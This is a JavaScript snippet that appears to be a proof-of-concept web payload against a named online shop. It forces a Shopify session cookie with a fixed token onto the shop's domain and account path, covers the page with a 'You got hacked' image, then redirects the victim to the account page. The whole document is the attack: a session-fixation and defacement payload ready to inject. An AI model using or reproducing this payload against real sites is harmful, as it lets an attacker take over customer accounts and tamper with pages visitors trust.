document.cookie=`_shopify_essential=:AZoCgS7XAAH_NjBabmNhbVLYlEkELGWHn486mWb-syUs7L3vOv8zjAxCRbbodheCDy5rtEQT3Wsh5b6WNscmqIc47juLPYh77Qp_-fT974HAmGBPjPQEWYvMLQVEIEFnAsn39YRNNzk2Qi4NbRYsVcMp1eTph37rmaIPdyNZ0hc3Xl4166GGwdz4JQY_qzGSE8EDVoAywkbW6hUr8ME5xHzaCZNKtXPd4Ch4tG0Y4Nw4wFiVYM1oQkxp8UCSFo6jekZmF4ACUT4WOkEt8gePPGsoI53Eic0Gb3l54j3NsRj_obSSpFCf7khjZXiAemggyNOHqquZ7ebWxb4sAbw6EfUbyE1qmxLf2w7sKa9bT_IKw9ZSz9YUs4c_IoyHSJAOAK9pgyVf8ON3uOWQDNwl_1ysbhLFE-ounRTLbgYtEFDCd1xBo9dz_WrFszBHM4RqprmnjBqvkJPtbOTAjaU55la0nDl0nFVxShTcyW3rEtMGGJs71redkHkDS6ZO8UoieMy4CzrtyHSxkfGH4UgfQGUIU0NeLk0ZbuH-cmM2mZx_:; Path=/account; Domain=.oatsome.de`;

// --- Fun overlay: show "you got hacked" image for 10s, then redirect ---
(function(){
	try{
		var imgUrl = 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTldLYnoDijQVSRlo7gyI6DRgOj2PwpQ-yUiQ&s';

		var overlay = document.createElement('div');
		overlay.id = 'poc-overlay';
		Object.assign(overlay.style, {
			position: 'fixed',
			top: '0',
			left: '0',
			width: '100%',
			height: '100%',
			background: 'rgba(0,0,0,0.8)',
			display: 'flex',
			alignItems: 'center',
			justifyContent: 'center',
			zIndex: '2147483647',
			cursor: 'pointer'
		});

		var img = document.createElement('img');
		img.src = imgUrl;
		img.alt = 'You got hacked';
		Object.assign(img.style, {
			maxWidth: '90%',
			maxHeight: '90%',
			boxShadow: '0 0 30px rgba(0,0,0,0.7)',
			border: '6px solid #fff',
			borderRadius: '8px'
		});

		overlay.appendChild(img);

		// Append to document (use documentElement so it works even if body is not present)
		(document.documentElement || document.body || document).appendChild(overlay);

		// Allow user to click overlay to dismiss early
		overlay.addEventListener('click', function(){
			try{ overlay.parentNode && overlay.parentNode.removeChild(overlay); }catch(e){}
		});

		// Wait 10s, then remove overlay and redirect
		setTimeout(function(){
			try{ overlay.parentNode && overlay.parentNode.removeChild(overlay); }catch(e){}
			window.location.href = 'https://www.oatsome.de/account';
		}, 10000);
	}catch(e){
		// If anything fails, still redirect after 10s as a fallback
		setTimeout(function(){ window.location.href = 'https://www.oatsome.de/account'; }, 10000);
	}
})();

